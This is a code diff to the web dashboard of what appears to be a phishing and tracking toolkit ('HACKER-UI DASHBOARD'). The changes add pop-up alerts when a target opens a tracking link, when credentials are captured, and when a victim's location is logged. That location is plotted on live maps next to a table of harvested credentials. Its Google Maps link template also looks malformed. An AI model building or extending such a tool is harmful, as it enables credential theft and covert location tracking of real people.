@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: HACKER-UI DASHBOARD v6.7 (Final) ::</title>
+    <title>:: HACKER-UI DASHBOARD v6.8 (Final) ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -132,15 +132,47 @@
         const modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = document.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions');
         const qrModal = document.getElementById('qr-code-modal'), qrCloseBtn = document.getElementById('qr-close-btn'), qrContainer = document.getElementById('qr-code-container'), qrDownloadLink = document.getElementById('qr-download-link');
         let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false, qrcode = null;
+        
+        let currentCredentialCount = 0;
+        let isInitialLoad = true;
+        
+        function showNotification(message, icon = '💀') {
+            if (notificationSound.dataset.enabled === "true") {
+                notificationSound.currentTime = 0;
+                notificationSound.play().catch(e => console.error("Error playing sound:", e));
+            } else {
+                console.warn("Audio not enabled by user yet. Click anywhere to enable.");
+            }
+            const notificationElement = document.createElement("div");
+            notificationElement.className = "click-notification";
+            notificationElement.innerHTML = `<span>${icon}</span> ${message}`; 
+            document.body.appendChild(notificationElement);
+            setTimeout(() => {
+                notificationElement.style.opacity = "0";
+                setTimeout(() => notificationElement.remove(), 500);
+            }, 5000);
+        }
+        
+        function enableAudio() {
+            if (notificationSound.dataset.enabled === "true") return;
+            notificationSound.play().then(() => {
+                notificationSound.pause();
+                notificationSound.currentTime = 0;
+                notificationSound.dataset.enabled = "true";
+                console.log("✅ Audio unlocked successfully.");
+                document.body.removeEventListener("click", enableAudio);
+                document.body.removeEventListener("keydown", enableAudio);
+            }).catch(e => {
+                console.error("❌ Audio unlock failed. Requires user interaction.", e);
+            });
+        }
+        document.body.addEventListener('click', enableAudio, { once: true });
+        document.body.addEventListener('keydown', enableAudio, { once: true });
 
         function initModalMap() { if (!map) { const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' }); map = L.map('map', { center: [0, 0], zoom: 2, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(map); markersLayer = L.featureGroup().addTo(map); } }
         function initRealtimeMap() { if (!realtimeMap) { const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' }); realtimeMap = L.map('realtime-map', { center: [0, 0], zoom: 2, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(realtimeMap); realtimeMarkersLayer = L.featureGroup().addTo(realtimeMap); } }
         initRealtimeMap();
 
-        function enableAudio() { if(!isAudioEnabled){notificationSound.play().then(()=>{notificationSound.pause(),notificationSound.currentTime=0,isAudioEnabled=!0,console.log("✅ Audio unlocked successfully."),document.body.removeEventListener("click",enableAudio),document.body.removeEventListener("keydown",enableAudio)}).catch(e=>{console.error("❌ Audio unlock failed.",e)})} }
-        document.body.addEventListener('click', enableAudio, { once: !0 });
-        document.body.addEventListener('keydown', enableAudio, { once: !0 });
-        function showClickNotification(e) { if(isAudioEnabled){notificationSound.currentTime=0,notificationSound.play().catch(e=>console.error("Error playing sound:",e))}else{console.warn("Audio not enabled by user.")}const o=document.createElement("div");o.className="click-notification",o.innerHTML=`<span>💀</span> Target [<strong>${e}</strong>] has accessed the link!`,document.body.appendChild(o),setTimeout(()=>{o.style.opacity="0",setTimeout(()=>o.remove(),500)},5e3)}
         function showQrModal(url) { qrContainer.innerHTML = ''; qrModal.style.display = 'block'; qrcode = new QRCode(qrContainer, { text: url, width: 256, height: 256, colorDark : "#000000", colorLight : "#ffffff", correctLevel : QRCode.CorrectLevel.H }); setTimeout(() => { const canvas = qrContainer.querySelector('canvas'); if (canvas) { qrDownloadLink.href = canvas.toDataURL("image/png"); } }, 50); }
         qrCloseBtn.onclick = () => { qrModal.style.display = "none"; };
         closeBtn.onclick = () => { modal.style.display = "none" };
@@ -252,7 +284,7 @@
                             markersLayer.addLayer(marker);
                         });
                         const latestLocation = validLocations[0];
-                        const googleMapsUrl = `http://googleusercontent.com/maps.google.com/7{latestLocation.latitude},${latestLocation.longitude}`;
+                        const googleMapsUrl = `http://googleusercontent.com/maps.google.com/9{latestLocation.latitude},${latestLocation.longitude}`;
                         mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ VIEW MORE DETAILS ON GOOGLE MAPS ]</a>`;
                         map.fitBounds(markersLayer.getBounds());
                     } else {
@@ -276,6 +308,13 @@
         });
 
         socket.on('dashboard_update', e => {
+            if (!isInitialLoad && e.credentials.length > currentCredentialCount) {
+                const newCredential = e.credentials[0];
+                showNotification(`🔒 Credentials captured from [<strong>${newCredential.username}</strong>]!`, '🔒');
+            }
+            currentCredentialCount = e.credentials.length;
+            isInitialLoad = false;
+
             renderLocationLinksTable(e.links);
             renderMergedCredentialsTable(e.links, e.credentials);
             updateStats(e.stats);
@@ -284,15 +323,18 @@
         });
 
         socket.on('new_log_message', e => { const o = document.createElement('p'); o.textContent = e; logSection.appendChild(o); logSection.scrollTop = logSection.scrollHeight });
-        socket.on('link_clicked', e => { showClickNotification(e.username) });
+        socket.on('link_clicked', e => { showNotification(`Link accessed by [<strong>${e.username}</strong>]!`); });
         
         socket.on('new_location_logged', (newLocation) => {
+            showNotification(`📍 Location captured from [<strong>${newLocation.username}</strong>]!`, '📍');
             console.log('📍 New location received in real-time:', newLocation);
             const marker = L.marker([newLocation.latitude, newLocation.longitude]);
             const locationString = (newLocation.city && newLocation.country) ? `${newLocation.city}, ${newLocation.country}` : 'Location unknown';
             marker.bindPopup(`<b>${newLocation.username}</b><br>${new Date(newLocation.created_at).toLocaleString('id-ID')}<br><strong>${locationString}</strong>`);
-            realtimeMarkersLayer.addLayer(marker);
-            realtimeMap.panTo([newLocation.latitude, newLocation.longitude]);
+            if(realtimeMarkersLayer) {
+                realtimeMarkersLayer.addLayer(marker);
+                realtimeMap.panTo([newLocation.latitude, newLocation.longitude]);
+            }
         });
         
         linkForm.addEventListener('submit', async e => {
